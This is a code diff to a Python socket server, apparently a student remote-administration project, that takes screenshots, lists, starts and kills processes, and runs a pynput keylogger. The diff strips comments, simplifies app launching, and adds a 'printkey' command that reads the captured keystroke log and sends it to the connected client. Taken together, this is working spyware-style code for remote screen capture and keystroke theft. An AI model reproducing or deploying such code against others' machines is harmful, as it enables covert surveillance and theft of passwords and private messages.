@@ -8,7 +8,7 @@ import subprocess
 import pynput
 
 HOST = "127.0.0.1"
-PORT = 65432
+PORT = 54321
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((HOST, PORT))
@@ -55,19 +55,18 @@ try:
         data = conn.recv(1024)
         encodedData = data.decode("utf8")
         if encodedData == "*snap*":
-            snapshot = ImageGrab.grab()  # Take snap
+            snapshot = ImageGrab.grab()
             file = "scr.jpg"
             snapshot.save(file)
-            f = open('scr.jpg', 'rb')  # Open file in binary mode
+            f = open('scr.jpg', 'rb')
             dataImg = f.read()
-            dataImg = base64.b64encode(dataImg)  # Convert binary to base 64
+            dataImg = base64.b64encode(dataImg)
             f.close()
-            os.remove(file)  # Remove the snap
+            os.remove(file)
             conn.sendall(dataImg)
         elif encodedData == "-hello-":
-            # khi client bắt đầu connect gửi qua, nhận đc cái này thì trả về để client biết đã connect
             conn.sendall(bytes("-connected-", "utf8"))
-        elif encodedData == "-exit-":  # nhận cái này thì đóng sv luôn
+        elif encodedData == "-exit-":
             conn.close()
             break
         elif encodedData == "*close*":
@@ -176,6 +175,7 @@ try:
         elif encodedData == "kill_process":
             ID_str = conn.recv(1024).decode("utf8")
             ID_kill = int(ID_str)
+
             check_kill_comp = False
             for pro in psutil.process_iter():
                 if pro.pid == ID_kill:
@@ -188,27 +188,10 @@ try:
                 conn.sendall(bytes("kill_fail", "utf8"))
         elif encodedData == "start_app" or encodedData == "start_process":
             Name_start = conn.recv(1024).decode("utf8")
-            os.popen("start " + Name_start)
-            check_start = False
-            cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
-            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-            res = []
-            for line in proc.stdout:
-                if line.rstrip():
-                    name = line.decode().rstrip()
-                    res.append(name)
-            res = res[2:]
-            Name_res = []
-            for text in res:
-                Name_res.append(
-                    text[0:text.find(" ", 0, len(text))].strip(" "))
-            for pro in psutil.process_iter():
-                if(pro.name().replace('.exe', '') == Name_start and pro.name().replace('.exe', '') in Name_res):
-                    check_start = True
-                    break
-            if (check_start):
+            try:
+                os.startfile(Name_start)
                 conn.sendall(bytes("success", "utf8"))
-            else:
+            except:
                 conn.sendall(bytes("error", "utf8"))
         elif encodedData == "see_app":
             cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
@@ -216,9 +199,6 @@ try:
             res = []
             for line in proc.stdout:
                 if line.rstrip():
-                    # only print lines that are not empty
-                    # decode() is necessary to get rid of the binary string (b')
-                    # rstrip() to remove `\r\n`
                     name = line.decode().rstrip()
                     res.append(name)
             res = res[2:]
@@ -240,9 +220,6 @@ try:
             res = []
             for line in proc.stdout:
                 if line.rstrip():
-                    # only print lines that are not empty
-                    # decode() is necessary to get rid of the binary string (b')
-                    # rstrip() to remove `\r\n`
                     name = line.decode().rstrip()
                     res.append(name)
             res = res[2:]
@@ -270,15 +247,17 @@ try:
             f = open("keylog.txt", "a", encoding="utf8")
             listener = pynput.keyboard.Listener(on_press=on_press)
             listener.start()
-            # bắt đầu thread theo dõi
             data = conn.recv(1024).decode("utf8")
-            # khi nào nhận đc lệnh unhook
             if data == "unhook":
                 listener.stop()
                 listener.join()
                 f.close()
         elif encodedData == "printkey":
-            continue
+            f = open("keylog.txt", "r")
+            content = f.read()
+            conn.sendall(bytes(content, "utf8"))
+            f.close()
+
 
 except KeyboardInterrupt:
     conn.close()
